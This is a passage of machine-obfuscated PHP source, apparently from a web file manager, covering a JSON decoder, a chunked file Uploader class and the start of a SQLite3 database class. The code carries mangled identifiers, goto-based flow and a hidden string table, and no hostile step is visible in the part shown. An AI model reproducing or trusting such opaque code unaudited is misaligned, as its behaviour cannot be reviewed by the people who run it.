$d¶Ë∫‰»Àé[1329]: case $FöŸÓƒ€•Ω == $d¶Ë∫‰»Àé[1330]: case $FöŸÓƒ€•Ω == $d¶Ë∫‰»Àé[1331]: if ($b∞ı¬¥˘ıÓ == $d¶Ë∫‰»Àé[110] && $FöŸÓƒ€•Ω != $d¶Ë∫‰»Àé[1329] || $b∞ı¬¥˘ıÓ == $d¶Ë∫‰»Àé[63] && $FöŸÓƒ€•Ω != $d¶Ë∫‰»Àé[985]) { $a¢≈≤Ωªçå .= $aÆæÇ¢üü[++$Eç∆æ∫·¨√]; } break; case preg_match($d¶Ë∫‰»Àé[1332], substr($aÆæÇ¢üü, $Eç∆æ∫·¨√, 6)): $f®¯∏ÉâÑ” = chr(hexdec(substr($aÆæÇ¢üü, $Eç∆æ∫·¨√ + 2, 2))) . chr(hexdec(substr($aÆæÇ¢üü, $Eç∆æ∫·¨√ + 4, 2))); $a¢≈≤Ωªçå .= $this->utf162utf8($f®¯∏ÉâÑ”); $Eç∆æ∫·¨√ += 5; break; case $Bë∞÷çœ˜å >= 32 && $Bë∞÷çœ˜å <= 127: $a¢≈≤Ωªçå .= $aÆæÇ¢üü[$Eç∆æ∫·¨√]; break; case ($Bë∞÷çœ˜å & 224) == 192: $a¢≈≤Ωªçå .= substr($aÆæÇ¢üü, $Eç∆æ∫·¨√, 2); ++$Eç∆æ∫·¨√; break; case ($Bë∞÷çœ˜å & 240) == 224: $a¢≈≤Ωªçå .= substr($aÆæÇ¢üü, $Eç∆æ∫·¨√, 3); $Eç∆æ∫·¨√ += 2; break; case ($Bë∞÷çœ˜å & 248) == 240: $a¢≈≤Ωªçå .= substr($aÆæÇ¢üü, $Eç∆æ∫·¨√, 4); $Eç∆æ∫·¨√ += 3; break; case ($Bë∞÷çœ˜å & 252) == 248: $a¢≈≤Ωªçå .= substr($aÆæÇ¢üü, $Eç∆æ∫·¨√, 5); $Eç∆æ∫·¨√ += 4; break; case ($Bë∞÷çœ˜å & 254) == 252: $a¢≈≤Ωªçå .= substr($aÆæÇ¢üü, $Eç∆æ∫·¨√, 6); $Eç∆æ∫·¨√ += 5; break; } } return $a¢≈≤Ωªçå; } elseif (preg_match($d¶Ë∫‰»Àé[1333], $aø·åœ¶Õﬂ) || preg_match($d¶Ë∫‰»Àé[1334], $aø·åœ¶Õﬂ)) { goto c¬ñù√≤≠Ë; C—ı∞◊îë´: for ($Eç∆æ∫·¨√ = 0; $Eç∆æ∫·¨√ <= $e¬‘ÍÒã∑”; ++$Eç∆æ∫·¨√) { $C«îÆ—ò Ñ = end($d¡÷êÉÀíç); $FöŸÓƒ€•Ω = substr($aÆæÇ¢üü, $Eç∆æ∫·¨√, 2); if ($Eç∆æ∫·¨√ == $e¬‘ÍÒã∑” || $aÆæÇ¢üü[$Eç∆æ∫·¨√] == $d¶Ë∫‰»Àé[47] && $C«îÆ—ò Ñ[$d¶Ë∫‰»Àé[1335]] == SERVICES_JSON_SLICE) { $dÈßÓ¥ÔÂ§ = substr($aÆæÇ¢üü, $C«îÆ—ò Ñ[$d¶Ë∫‰»Àé[262]], $Eç∆æ∫·¨√ - $C«îÆ—ò Ñ[$d¶Ë∫‰»Àé[262]]); array_push($d¡÷êÉÀíç, array($d¶Ë∫‰»Àé[1335] => SERVICES_JSON_SLICE, $d¶Ë∫‰»Àé[262] => $Eç∆æ∫·¨√ + 1, $d¶Ë∫‰»Àé[1336] => !1)); if (reset($d¡÷êÉÀíç) == SERVICES_JSON_IN_ARR) { array_push($aÂÓæÈ∑èƒ, $this->decode($dÈßÓ¥ÔÂ§)); } elseif (reset($d¡÷êÉÀíç) == SERVICES_JSON_IN_OBJ) { $Cà¯á∏ﬁ‚ö = array(); if (preg_match($d¶Ë∫‰»Àé[1337], $dÈßÓ¥ÔÂ§, $Cà¯á∏ﬁ‚ö)) { $B–¢—·íµ∏ = $this->decode($Cà¯á∏ﬁ‚ö[1]); $A±ÚØñå¨≈ = $this->decode($Cà¯á∏ﬁ‚ö[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $e∆¥ﬂ⁄õ[$B–¢—·íµ∏] = $A±ÚØñå¨≈; } else { $e∆¥ﬂ⁄õ->{$B–¢—·íµ∏} = $A±ÚØñå¨≈; } } elseif (preg_match($d¶Ë∫‰»Àé[1338], $dÈßÓ¥ÔÂ§, $Cà¯á∏ﬁ‚ö)) { $B–¢—·íµ∏ = $Cà¯á∏ﬁ‚ö[1]; $A±ÚØñå¨≈ = $this->decode($Cà¯á∏ﬁ‚ö[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $e∆¥ﬂ⁄õ[$B–¢—·íµ∏] = $A±ÚØñå¨≈; } else { $e∆¥ﬂ⁄õ->{$B–¢—·íµ∏} = $A±ÚØñå¨≈; } } } } elseif (($aÆæÇ¢üü[$Eç∆æ∫·¨√] == $d¶Ë∫‰»Àé[110] || $aÆæÇ¢üü[$Eç∆æ∫·¨√] == $d¶Ë∫‰»Àé[63]) && $C«îÆ—ò Ñ[$d¶Ë∫‰»Àé[1335]] != SERVICES_JSON_IN_STR) { array_push($d¡÷êÉÀíç, array($d¶Ë∫‰»Àé[1335] => SERVICES_JSON_IN_STR, $d¶Ë∫‰»Àé[262] => $Eç∆æ∫·¨√, $d¶Ë∫‰»Àé[1336] => $aÆæÇ¢üü[$Eç∆æ∫·¨√])); } elseif ($aÆæÇ¢üü[$Eç∆æ∫·¨√] == $C«îÆ—ò Ñ[$d¶Ë∫‰»Àé[1336]] && $C«îÆ—ò Ñ[$d¶Ë∫‰»Àé[1335]] == SERVICES_JSON_IN_STR && (strlen(substr($aÆæÇ¢üü, 0, $Eç∆æ∫·¨√)) - strlen(rtrim(substr($aÆæÇ¢üü, 0, $Eç∆æ∫·¨√), $d¶Ë∫‰»Àé[100]))) % 2 != 1) { array_pop($d¡÷êÉÀíç); } elseif ($aÆæÇ¢üü[$Eç∆æ∫·¨√] == $d¶Ë∫‰»Àé[1321] && in_array($C«îÆ—ò Ñ[$d¶Ë∫‰»Àé[1335]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($d¡÷êÉÀíç, array($d¶Ë∫‰»Àé[1335] => SERVICES_JSON_IN_ARR, $d¶Ë∫‰»Àé[262] => $Eç∆æ∫·¨√, $d¶Ë∫‰»Àé[1336] => !1)); } elseif ($aÆæÇ¢üü[$Eç∆æ∫·¨√] == $d¶Ë∫‰»Àé[1322] && $C«îÆ—ò Ñ[$d¶Ë∫‰»Àé[1335]] == SERVICES_JSON_IN_ARR) { array_pop($d¡÷êÉÀíç); } elseif ($aÆæÇ¢üü[$Eç∆æ∫·¨√] == $d¶Ë∫‰»Àé[795] && in_array($C«îÆ—ò Ñ[$d¶Ë∫‰»Àé[1335]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($d¡÷êÉÀíç, array($d¶Ë∫‰»Àé[1335] => SERVICES_JSON_IN_OBJ, $d¶Ë∫‰»Àé[262] => $Eç∆æ∫·¨√, $d¶Ë∫‰»Àé[1336] => !1)); } elseif ($aÆæÇ¢üü[$Eç∆æ∫·¨√] == $d¶Ë∫‰»Àé[314] && $C«îÆ—ò Ñ[$d¶Ë∫‰»Àé[1335]] == SERVICES_JSON_IN_OBJ) { array_pop($d¡÷êÉÀíç); } elseif ($FöŸÓƒ€•Ω == $d¶Ë∫‰»Àé[1339] && in_array($C«îÆ—ò Ñ[$d¶Ë∫‰»Àé[1335]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($d¡÷êÉÀíç, array($d¶Ë∫‰»Àé[1335] => SERVICES_JSON_IN_CMT, $d¶Ë∫‰»Àé[262] => $Eç∆æ∫·¨√, $d¶Ë∫‰»Àé[1336] => !1)); $Eç∆æ∫·¨√++; } elseif ($FöŸÓƒ€•Ω == $d¶Ë∫‰»Àé[1340] && $C«îÆ—ò Ñ[$d¶Ë∫‰»Àé[1335]] == SERVICES_JSON_IN_CMT) { array_pop($d¡÷êÉÀíç); $Eç∆æ∫·¨√++; for ($CïÇæ◊±àô = $C«îÆ—ò Ñ[$d¶Ë∫‰»Àé[262]]; $CïÇæ◊±àô <= $Eç∆æ∫·¨√; ++$CïÇæ◊±àô) { $aÆæÇ¢üü = substr_replace($aÆæÇ¢üü, $d¶Ë∫‰»Àé[50], $CïÇæ◊±àô, 1); } } } if (reset($d¡÷êÉÀíç) == SERVICES_JSON_IN_ARR) { return $aÂÓæÈ∑èƒ; } elseif (reset($d¡÷êÉÀíç) == SERVICES_JSON_IN_OBJ) { return $e∆¥ﬂ⁄õ; } goto Bƒ’ÀÑâµÀ; FÛº‘Ñ⁄Øè: $aÆæÇ¢üü = $this->reduce_string($aÆæÇ¢üü); if ($aÆæÇ¢üü == $d¶Ë∫‰»Àé[33]) { if (reset($d¡÷êÉÀíç) == SERVICES_JSON_IN_ARR) { return $aÂÓæÈ∑èƒ; } else { return $e∆¥ﬂ⁄õ; } } $e¬‘ÍÒã∑” = strlen($aÆæÇ¢üü); goto C—ı∞◊îë´; c¬ñù√≤≠Ë: if ($aø·åœ¶Õﬂ[0] == $d¶Ë∫‰»Àé[1321]) { $d¡÷êÉÀíç = array(SERVICES_JSON_IN_ARR); $aÂÓæÈ∑èƒ = array(); } else { if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $d¡÷êÉÀíç = array(SERVICES_JSON_IN_OBJ); $e∆¥ﬂ⁄õ = array(); } else { $d¡÷êÉÀíç = array(SERVICES_JSON_IN_OBJ); $e∆¥ﬂ⁄õ = new stdClass(); } } array_push($d¡÷êÉÀíç, array($d¶Ë∫‰»Àé[1335] => SERVICES_JSON_SLICE, $d¶Ë∫‰»Àé[262] => 0, $d¶Ë∫‰»Àé[1336] => !1)); $aÆæÇ¢üü = substr($aø·åœ¶Õﬂ, 1, -1); goto FÛº‘Ñ⁄Øè; Bƒ’ÀÑâµÀ: } } } function isError($cáÿ∏Òﬁ¥ß, $AãÀûπ±‹Ü = null) { $e∆®”®í”ó =& $_SERVER[∞„˜ƒÑºª]; if (class_exists($e∆®”®í”ó[1341])) { return PEAR::isError($cáÿ∏Òﬁ¥ß, $AãÀûπ±‹Ü); } elseif (is_object($cáÿ∏Òﬁ¥ß) && (get_class($cáÿ∏Òﬁ¥ß) == $e∆®”®í”ó[1342] || is_subclass_of($cáÿ∏Òﬁ¥ß, $e∆®”®í”ó[1342]))) { return !0; } return !1; } } if (class_exists($_SERVER[∞„˜ƒÑºª][1343])) { class Services_JSON_Error extends PEAR_Error { function __construct($fäÒçú˜ºÙ = "\x75\x6e\x6b\156\157\x77\156\40\145\162\x72\x6f\162", $BÆá•£ øê = null, $Fó©Ï≈∏úï = null, $B¨ Ëëñè‡ = null, $Aƒ≈ÆÛˆÕõ = null) { parent::PEAR_Error($fäÒçú˜ºÙ, $BÆá•£ øê, $Fó©Ï≈∏úï, $B¨ Ëëñè‡, $Aƒ≈ÆÛˆÕõ); } } } else { class Services_JSON_Error { function __construct($F«·Ö∆¶Œù = "\x75\156\x6b\x6e\x6f\x77\156\x20\x65\x72\162\x6f\x72", $DÔàù •àæ = null, $e—éúà»Ÿ¨ = null, $f·Ω±·ªÛÔ = null, $Büô“‹ûÑ∑ = null) { } } } class Uploader { public $fileName; public $uploadFile; public $tempFile; public function __construct() { goto dª·∂€ñ Ñ; aÉ—Ó≥Æàè: if (!empty($_FILES)) { $Cù“´µ¬Ö¥ = $_FILES[$C‰Í†í¨øß[163]]; $this->uploadFile = $Cù“´µ¬Ö¥[$C‰Í†í¨øß[1344]]; if (!$this->uploadFile && $Cù“´µ¬Ö¥[$C‰Í†í¨øß[928]] > 0) { show_json($this->errorInfo($Cù“´µ¬Ö¥[$C‰Í†í¨øß[928]]), !1); } } else { if (isset($in[$C‰Í†í¨øß[387]])) { $this->uploadFile = isset($in[$C‰Í†í¨øß[1345]]) ? $C‰Í†í¨øß[1346] : $C‰Í†í¨øß[1210]; } } $this->fileName = self::fileName(); $this->statusData = !1; goto E–®°Ì˘¯ì; dª·∂€ñ Ñ: $C‰Í†í¨øß =& $_SERVER[∞„˜ƒÑºª]; global $in; $this->in =& $in; goto aÉ—Ó≥Æàè; E–®°Ì˘¯ì: $this->checkSize(); $this->tempPathInit(); goto d√‹íÛÓ‘∂; d√‹íÛÓ‘∂: } public function upload() { goto eå≤æëπè«; eå≤æëπè«: $dµ¢¥ñ„íö =& $_SERVER[∞„˜ƒÑºª]; $eÑÉñ´îƒ∆ = isset($this->in[$dµ¢¥ñ„íö[1347]]) ? intval($this->in[$dµ¢¥ñ„íö[1347]]) : 0; $dˆıÈó±õ‰ = isset($this->in[$dµ¢¥ñ„íö[1348]]) ? intval($this->in[$dµ¢¥ñ„íö[1348]]) : 1; goto Föê±àù∏ÿ; eˆ≤ƒ◊•‡õ: if (!$eÜ·˘Ûèƒî) { $this->showJson($dµ¢¥ñ„íö[1354] . $eÑÉñ´îƒ∆, !1); } $aÎŒ¨≈≤‘Ï[$dµ¢¥ñ„íö[1355]] = $dˆıÈó±õ‰; $aÎŒ¨≈≤‘Ï[$dµ¢¥ñ„íö[1356]][$dµ¢¥ñ„íö[1357] . $eÑÉñ´îƒ∆] = array($dµ¢¥ñ„íö[1358] => $B•¿óêÑÁ°, $dµ¢¥ñ„íö[766] => $eÑÉñ´îƒ∆, $dµ¢¥ñ„íö[86] => $a˘â≤¡˜⁄è, $dµ¢¥ñ„íö[160] => $bÚ—ÿ–ÈÆú); goto A˜¿ï‹≈Ñ¶; F◊äüåÍÛé: $bÚ—ÿ–ÈÆú = IO::hashSimple($A≤¡£óÚ÷à); $a˘â≤¡˜⁄è = IO::size($A≤¡£óÚ÷à); @unlink($A≤¡£óÚ÷à); goto eˆ≤ƒ◊•‡õ; Föê±àù∏ÿ: $FÍ ∂Ó§üç = $this->tempFile . $dµ¢¥ñ„íö[1349] . $eÑÉñ´îƒ∆; $a˘â≤¡˜⁄è = isset($this->in[$dµ¢¥ñ„íö[391]]) ? intval($this->in[$dµ¢¥ñ„íö[391]]) : 0; $EÒ¯∫öâõ∫ = isset($this->in[$dµ¢¥ñ„íö[1350]]) ? intval($this->in[$dµ¢¥ñ„íö[1350]]) : 0; goto Féµ◊àÒ‘€; A“Û‰πÃŒæ: return $this->tempFile; goto Eåπˆ∑÷ı; A˜¿ï‹≈Ñ¶: $this->statusSet($aÎŒ¨≈≤‘Ï); if (count($aÎŒ¨≈≤‘Ï[$dµ¢¥ñ„íö[1356]]) != $aÎŒ¨≈≤‘Ï[$dµ¢¥ñ„íö[1355]]) { $this->showJson($dµ¢¥ñ„íö[1359] . $eÑÉñ´îƒ∆, !0); } ignore_timeout(); goto dœ‚•Õ◊Â¨; dœ‚•Õ◊Â¨: if (!$this->checkChunkHash($aÎŒ¨≈≤‘Ï)) { $this->showJson($dµ¢¥ñ„íö[1360], !1); } $this->statusSet(!1); CacheLock::unlock($this->tempFile); goto A“Û‰πÃŒæ; dé«∞¿√ÀŸ: $bıï∫àÉ”‡ = @fopen($this->tempFile, $dµ¢¥ñ„íö[1353]); fseek($bıï∫àÉ”‡, $B•¿óêÑÁ°); $eÜ·˘Ûèƒî = $this->writeTo($A≤¡£óÚ÷à, $bıï∫àÉ”‡, $this->tempFile); goto F◊äüåÍÛé; FöπÖªê¡”: $A≤¡£óÚ÷à = $this->moveUploadedFile($FÍ ∂Ó§üç); if (!$A≤¡£óÚ÷à) { $this->showJson(LNG($dµ¢¥ñ„íö[1352]), !1); } $B•¿óêÑÁ° = $eÑÉñ´îƒ∆ * $EÒ¯∫öâõ∫; goto dé«∞¿√ÀŸ; b–Î¢åÌÊß: CacheLock::lock($this->tempFile, 20); $aÎŒ¨≈≤‘Ï = $this->statusGet(); $this->initFileTemp(); goto FöπÖªê¡”; Féµ◊àÒ‘€: if ($dˆıÈó±õ‰ > 1 && $EÒ¯∫öâõ∫ <= 0) { show_json($dµ¢¥ñ„íö[1351], !1); } if ($EÒ¯∫öâõ∫ > $a˘â≤¡˜⁄è) { $dˆıÈó±õ‰ = 1; } if ($dˆıÈó±õ‰ <= 1) { $this->tempFile = $this->tempFile . rand_string(5); $this->statusSet(!1); return $this->moveUploadedFile($this->tempFile); } goto b–Î¢åÌÊß; Eåπˆ∑÷ı: } private function checkSize() { $eæÇ«µøÉﬁ =& $_SERVER[∞„˜ƒÑºª]; if (phpBuild64() || $this->in[$eæÇ«µøÉﬁ[86]] < PHP_INT_MAX) { return; } show_json(LNG($eæÇ«µøÉﬁ[1361]), !1); } private function showJson($bö›µÑîãã, $c—€¿Ç™Ëì) { CacheLock::unlock($this->tempFile); if (!$c—€¿Ç™Ëì) { return show_json($bö›µÑîãã, $c—€¿Ç™Ëì); } show_json($bö›µÑîãã, $c—€¿Ç™Ëì); } public function clearData() { $this->statusSet(!1); if (file_exists($this->tempFile)) { @unlink($this->tempFile); return; } } private function tempPathInit() { goto bƒ™¯ŸÂÕ◊; Eø∏¬ÓÍñ¡: $this->tempFile = $D“ˆáÑ‹á . $E∂öèöÖˆ√[1364] . md5($EÀ‘·ñÉ∆… . $this->in[$E∂öèöÖˆ√[1365]]); goto e≤ç“Ñ‹§ô; dûõıéÊ´Î: touch($D“ˆáÑ‹á . $E∂öèöÖˆ√[1362]); $EÀ‘·ñÉ∆… = isset($this->in[$E∂öèöÖˆ√[1363]]) ? $this->in[$E∂öèöÖˆ√[1363]] : !1; if (strlen($EÀ‘·ñÉ∆…) < 30) { $EÀ‘·ñÉ∆… = md5(USER_ID . $this->in[$E∂öèöÖˆ√[84]] . $this->fileName . $this->in[$E∂öèöÖˆ√[86]]); } goto Eø∏¬ÓÍñ¡; bƒ™¯ŸÂÕ◊: $E∂öèöÖˆ√ =& $_SERVER[∞„˜ƒÑºª]; $D“ˆáÑ‹á = TEMP_FILES; @mk_dir($D“ˆáÑ‹á); goto dûõıéÊ´Î; e≤ç“Ñ‹§ô: } private function moveUploadedFile($Cﬁí‘ÛÜæô) { $BŸÀå»≠«› =& $_SERVER[∞„˜ƒÑºª]; $EÖ†ÂºÖ‰ò = $this->uploadFile; if ($EÖ†ÂºÖ‰ò == $BŸÀå»≠«›[1366]) { @file_put_contents($Cﬁí‘ÛÜæô, base64_decode($_REQUEST[$BŸÀå»≠«›[1367]])); } else { if ($EÖ†ÂºÖ‰ò == $BŸÀå»≠«›[1210]) { $A√ú÷œÜêÁ = @fopen($Cﬁí‘ÛÜæô, $BŸÀå»≠«›[1136]); $this->writeTo($EÖ†ÂºÖ‰ò, $A√ú÷œÜêÁ, $Cﬁí‘ÛÜæô); } else { if (!move_uploaded_file($EÖ†ÂºÖ‰ò, $Cﬁí‘ÛÜæô)) { return !1; } } } return $Cﬁí‘ÛÜæô; } private function writeTo($F£°Œº…ì∆, $Aû£∞±î«õ, $aìÿÑÆÚéù) { goto F„¢®ë ¥Ç; dËôºΩùÉ˜: return !0; goto dùâ≈‚¡ÑÉ; aôè€Ñôà∂: fclose($f•»Ë·–ﬂÏ); fclose($Aû£∞±î«õ); CacheLock::unlock($CÎàÖˆ•Ëî); goto dËôºΩùÉ˜; F„¢®ë ¥Ç: $bÚÇ∏ı≥‚≠ =& $_SERVER[∞„˜ƒÑºª]; $CÎàÖˆ•Ëî = $bÚÇ∏ı≥‚≠[1368] . $aìÿÑÆÚéù; $BıÈ⁄ﬁıáı = CacheLock::lock($CÎàÖˆ•Ëî, 1); goto C≈ﬂù©†¶Ì; C≈ﬂù©†¶Ì: $f•»Ë·–ﬂÏ = @fopen($F£°Œº…ì∆, $bÚÇ∏ı≥‚≠[1135]); if (!$f•»Ë·–ﬂÏ || !$Aû£∞±î«õ || !$BıÈ⁄ﬁıáı) { CacheLock::unlock($CÎàÖˆ•Ëî); return !1; } while (!feof($f•»Ë·–ﬂÏ)) { fwrite($Aû£∞±î«õ, fread($f•»Ë·–ﬂÏ, 1024 * 200)); } goto aôè€Ñôà∂; dùâ≈‚¡ÑÉ: } private function statusGet() { goto DÔﬂÉõÛ…∂; DÔﬂÉõÛ…∂: $CÛáùŒ¥ëå =& $_SERVER[∞„˜ƒÑºª]; if (is_array($this->statusData)) { return $this->statusData; } $aõàêàå™® = $this->tempFile . $CÛáùŒ¥ëå[1369]; goto E‡‘ê€èïÇ; bºÙß≤í™Î: if (!$this->statusData) { $C£Ÿƒ°øÔ÷ = array($CÛáùŒ¥ëå[28] => $this->fileName, $CÛáùŒ¥ëå[1355] => 0, $CÛáùŒ¥ëå[1356] => array()); $this->statusSet($C£Ÿƒ°øÔ÷); } return $this->statusData; goto b∏Öæ∑—ùÜ; E‡‘ê€èïÇ: $eﬁ¿âø‚≠≈ = !1; if (file_exists($aõàêàå™®)) { $eﬁ¿âø‚≠≈ = @file_get_contents($aõàêàå™®); } if ($eﬁ¿âø‚≠≈) { $this->statusData = unserialize($eﬁ¿âø‚≠≈); } goto bºÙß≤í™Î; b∏Öæ∑—ùÜ: } public function statusSet($açÉÇú‘»˜) { $eî‚‡ÑËáã = $this->tempFile . $_SERVER[∞„˜ƒÑºª][1369]; if (!$açÉÇú‘»˜) { if (file_exists($eî‚‡ÑËáã)) { @unlink($eî‚‡ÑËáã); } return !0; } $this->statusData = $açÉÇú‘»˜; return file_put_contents($eî‚‡ÑËáã, serialize($açÉÇú‘»˜)); } private function initFileTemp() { $dåøáó◊†Ò =& $_SERVER[∞„˜ƒÑºª]; if (file_exists($this->tempFile)) { return; } $Aä¨åêÛïç = fopen($this->tempFile, $dåøáó◊†Ò[1370]); fseek($Aä¨åêÛïç, $this->in[$dåøáó◊†Ò[86]] - 1, SEEK_SET); fwrite($Aä¨åêÛïç, $dåøáó◊†Ò[402]); fclose($Aä¨åêÛïç); } public function checkChunk() { goto fªìÕ©Í‹à; aÆØ…¬åÊ: $a±ì∆÷ÙËﬂ = $this->statusGet(); CacheLock::unlock($this->tempFile); foreach ($a±ì∆÷ÙËﬂ[$f√∂—ó–°∏[1356]] as $cÌ÷ÙË•ÓÔ) { $A√¶é÷ı¨Ÿ = $cÌ÷ÙË•ÓÔ[$f√∂—ó–°∏[160]]; if ($A√¶é÷ı¨Ÿ) { $c˘©∞…‚ÿÊ[$f√∂—ó–°∏[1371] . $cÌ÷ÙË•ÓÔ[$f√∂—ó–°∏[766]]] = $A√¶é÷ı¨Ÿ; } } goto b÷≥ó©ƒºŸ; fªìÕ©Í‹à: $f√∂—ó–°∏ =& $_SERVER[∞„˜ƒÑºª]; $c˘©∞…‚ÿÊ = array(); CacheLock::lock($this->tempFile); goto aÆØ…¬åÊ; b÷≥ó©ƒºŸ: return $c˘©∞…‚ÿÊ; goto AÁµ”©ˆÏ; AÁµ”©ˆÏ: } private function checkChunkHash($aå∂Èªæµã) { goto cÒ©©ÉﬁÊ≠; aº–ªÂÖÓè: $bÎÚ©ÜÔæ◊ = _get($this->in, $A·ﬂì†ìıﬂ[1372]); if (strlen($bÎÚ©ÜÔæ◊) == 32 && IO::hashSimple($this->tempFile) == $b€ıÖ‡Õ»∆ && IO::hashMd5($this->tempFile) == $bÎÚ©ÜÔæ◊) { return !0; } $bÎÑ≥æåøå = fopen($this->tempFile, $A·ﬂì†ìıﬂ[875]); goto a–∆»åû‘Ö; CÃÁ–«Ç¶∑: return $D…™ÿÚªﬂÖ; goto BÌ¢‚ÂÍˆ’; a–∆»åû‘Ö: $D…™ÿÚªﬂÖ = !0; foreach ($aå∂Èªæµã[$A·ﬂì†ìıﬂ[1356]] as $eÚ´ö¢÷∑Î) { fseek($bÎÑ≥æåøå, $eÚ´ö¢÷∑Î[$A·ﬂì†ìıﬂ[1358]]); $E“”∏äﬂ÷ø = PathDriverStream::hash($bÎÑ≥æåøå, $eÚ´ö¢÷∑Î[$A·ﬂì†ìıﬂ[86]]); if ($eÚ´ö¢÷∑Î[$A·ﬂì†ìıﬂ[160]] != $E“”∏äﬂ÷ø) { $D…™ÿÚªﬂÖ = !1; break; } } fclose($bÎÑ≥æåøå); goto CÃÁ–«Ç¶∑; cÒ©©ÉﬁÊ≠: $A·ﬂì†ìıﬂ =& $_SERVER[∞„˜ƒÑºª]; if (count($aå∂Èªæµã[$A·ﬂì†ìıﬂ[1356]]) != $aå∂Èªæµã[$A·ﬂì†ìıﬂ[1355]]) { return !1; } $b€ıÖ‡Õ»∆ = _get($this->in, $A·ﬂì†ìıﬂ[1363]); goto aº–ªÂÖÓè; BÌ¢‚ÂÍˆ’: } public static function fileName() { goto bÈ≤”›¡É; bÈ≤”›¡É: $bÌÎà¬ﬁãí =& $_SERVER[∞„˜ƒÑºª]; global $in; $fô∑“ΩìÊ‰ = isset($in[$bÌÎà¬ﬁãí[28]]) ? $in[$bÌÎà¬ﬁãí[28]] : $bÌÎà¬ﬁãí[33]; goto b»í≈ƒíïö; b»í≈ƒíïö: if (!empty($_FILES)) { $fô∑“ΩìÊ‰ = $fô∑“ΩìÊ‰ ? $fô∑“ΩìÊ‰ : $_FILES[$bÌÎà¬ﬁãí[163]][$bÌÎà¬ﬁãí[387]]; } $fô∑“ΩìÊ‰ = str_replace(array($bÌÎà¬ﬁãí[100], $bÌÎà¬ﬁãí[8]), array($bÌÎà¬ﬁãí[8], $bÌÎà¬ﬁãí[98]), trim($fô∑“ΩìÊ‰)); if (!is_wap()) { return $fô∑“ΩìÊ‰; } goto BÇ◊äëπ“—; BÇ◊äëπ“—: $D⁄¨È¬ß∂  = strtotime($in[$bÌÎà¬ﬁãí[1373]]); $D⁄¨È¬ß∂  = $D⁄¨È¬ß∂  ? $D⁄¨È¬ß∂  : time(); $dÑ∆†ÈÆ”‰ = strtolower($fô∑“ΩìÊ‰); goto aàŸô¶ÑÆﬂ; aàŸô¶ÑÆﬂ: if ($dÑ∆†ÈÆ”‰ == $bÌÎà¬ﬁãí[1374] || $dÑ∆†ÈÆ”‰ == $bÌÎà¬ﬁãí[1375]) { $fô∑“ΩìÊ‰ = date($bÌÎà¬ﬁãí[446], $D⁄¨È¬ß∂ ) . $bÌÎà¬ﬁãí[79] . $in[$bÌÎà¬ﬁãí[86]] . $bÌÎà¬ﬁãí[1376]; } else { if ($dÑ∆†ÈÆ”‰ == $bÌÎà¬ﬁãí[1377]) { $fô∑“ΩìÊ‰ = date($bÌÎà¬ﬁãí[446], $D⁄¨È¬ß∂ ) . $bÌÎà¬ﬁãí[79] . $in[$bÌÎà¬ﬁãí[86]] . $bÌÎà¬ﬁãí[1378]; } } return $fô∑“ΩìÊ‰; goto B∆π¯≠∞éÁ; B∆π¯≠∞éÁ: } private function errorInfo($F¢‚ÇäçÉˆ) { $eØœã¡∫·ü =& $_SERVER[∞„˜ƒÑºª]; $e§¥óˆ¯Ñ¥ = array($eØœã¡∫·ü[1379], $eØœã¡∫·ü[1380], $eØœã¡∫·ü[1381], $eØœã¡∫·ü[1382], $eØœã¡∫·ü[1383], $eØœã¡∫·ü[1384], $eØœã¡∫·ü[1385], $eØœã¡∫·ü[1386]); return $F¢‚ÇäçÉˆ . $eØœã¡∫·ü[4] . $e§¥óˆ¯Ñ¥[$F¢‚ÇäçÉˆ]; } } goto F≠Ù‰¥∑Õ‘; EóÈ«å‚ï‚: class DbSqlite3Base extends Db { public function __construct($AûÇ∏éÉä≠ = '') { $d∆√Çñ®‚´ =& $_SERVER[∞„˜ƒÑºª]; if (!class_exists($d∆√Çñ®‚´[59])) { think_exception(think_lang($d∆√Çñ®‚´[10]) . $d∆√Çñ®‚´[60]); } if (!empty($AûÇ∏éÉä≠)) { if (!isset($AûÇ∏éÉä≠[$d∆√Çñ®‚´[12]])) { $AûÇ∏éÉä≠[$d∆√Çñ®‚´[12]] = 438; } $this->config = $AûÇ∏éÉä≠; if (empty($this->config[$d∆√Çñ®‚´[13]])) { $this->config[$d∆√Çñ®‚´[13]] = array(); } } } public function connect($D∞”“‰Ù≠¢ = '', $E§âôô≈é‰ = 0) { $aõüÁÁÑ∫ó =& $_SERVER[∞„˜ƒÑºª]; if (!isset($this->linkID[$E§âôô≈é‰])) { if (empty($D∞”“‰Ù≠¢)) { $D∞”“‰Ù≠¢ = $this->config; } $this->linkID[$E§âôô≈é‰] = new SQLite3($D∞”“‰Ù≠¢[$aõüÁÁÑ∫ó[17]]); if (!$this->linkID[$E§âôô≈é‰]) { think_exception($this->linkID[$E§âôô≈é‰]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$E§âôô≈é‰]->busyTimeout(30000); if (1 != think_config($aõüÁÁÑ∫ó[18])) { unset($this->config); } } return $this->linkID[$E§âôô≈é‰]; } public function free() { $this->queryID = null; } public function query($D›êÂÖçåË) { goto eÏø£åáãì; A´°ú⁄⁄Ùè: if (!1 === $this->queryID) { $this->error(); return !1; } else { $d“ÚÀ∞ƒÂÿ = $this->getAll(); $this->numRows = count($d“ÚÀ∞ƒÂÿ); return $d“ÚÀ∞ƒÂÿ; } goto FÊÚàÊ±úï; BõÍÌù˜Î∑: $this->queryStr = $D›êÂÖçåË; if ($this->queryID) { $this->free(); } think_action_status($D°Ë˜—ªµÌ[19], 1); goto DÀﬁèñîœﬂ; DÀﬁèñîœﬂ: think_status($D°Ë˜—ªµÌ[20]); $this->queryID = $this->_linkID->query($D›êÂÖçåË); $this->debug(); goto A´°ú⁄⁄Ùè; eÏø£åáãì: $D°Ë˜—ªµÌ =& $_SERVER[∞„˜ƒÑºª]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto BõÍÌù˜Î∑; FÊÚàÊ±úï: } public function execute($Bñ—Ìá—¬—) { goto FåÉÂÑ‚ÙÓ; eä†æÿÜ¥¶: $this->queryStr = $Bñ—Ìá—¬—; if ($this->queryID) { $this->free(); } 